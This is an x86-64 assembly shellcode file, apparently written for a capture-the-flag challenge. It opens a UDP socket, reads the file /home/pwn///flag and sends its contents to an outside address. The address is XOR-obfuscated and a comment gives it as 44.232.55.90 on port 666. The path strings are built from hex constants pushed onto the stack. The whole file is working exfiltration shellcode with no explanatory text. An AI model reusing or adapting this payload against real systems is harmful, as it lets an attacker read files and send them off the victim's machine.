; sc.asm
section .text
global _start

_start:
  ; just to clear the child process registers 
  xor rax, rax
  xor rbx, rbx
  xor rcx, rcx
  xor rdx, rdx
  xor rdi, rdi
  xor rsi, rsi
  xor r8, r8
  xor r9, r9
  xor r10, r10
  xor r11, r11
  xor r12, r12
  xor r13, r13
  xor r14, r14
  xor r15, r15

 ; socket(PF_INET, SOCK_DGRAM, IPPROTO_IP)
  push byte 2
  pop rdi
  mov rsi, rdi
  xor rax, rax
  mov al, 0x29 ; __NR_socket
  syscall

  ; open("/home/pwn///flag", O_RDONLY) 
  mov r12, rax
  xor rsi, rsi
  push rsi
  push 1
  dec byte [rsp]
  mov rax, 0x67616c662f2f2f6e
  push rax
  mov rax, 0x77702f656d6f682f
  push rax
  mov rdi, rsp ; /home/pwn///flag
  xor edx, edx 
  xor esi, esi 
  push 2 ; __NR_open
  pop rax
  syscall

  ; read(fd, buf, 0x38)
  mov r11, rax ; flag fd to r11
  xor eax, eax ; __NR_read  = 0
  mov rdi, r11 ; flag fd
  push 0x38
  pop rdx
  sub rsp, 0x38 ; buf
  mov rsi, rsp
  syscall
	
  ;sendto(int sockfd, const void *buf, size_t len, int flags,
  ;      const struct sockaddr *dest_addr, socklen_t addrlen);
  lea r11, [rsp]
  mov rdx, rax ; len
  mov rax, 0x101010101010101
  push rax
  mov rax, 0x101010101010101 ^ 0x5a37e82c9a020002
  xor [rsp], rax
  mov r8, rsp ; {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr("44.232.55.90")}
  xor r10, r10 
  push r10
  push 1
  pop r10
  dec r10	
  push 0x10
  pop r9 ; addrlen
  mov rsi, r11 ; buf
  mov rdi, r12 ; sockfd
  xor rax, rax
  mov al, 0x2c ; __NR_sendto
  syscall

  ; exit(0)
  xor rdi, rdi
  xor rsi, rsi
  xor rax, rax
  mov al, 0x3c
  syscall

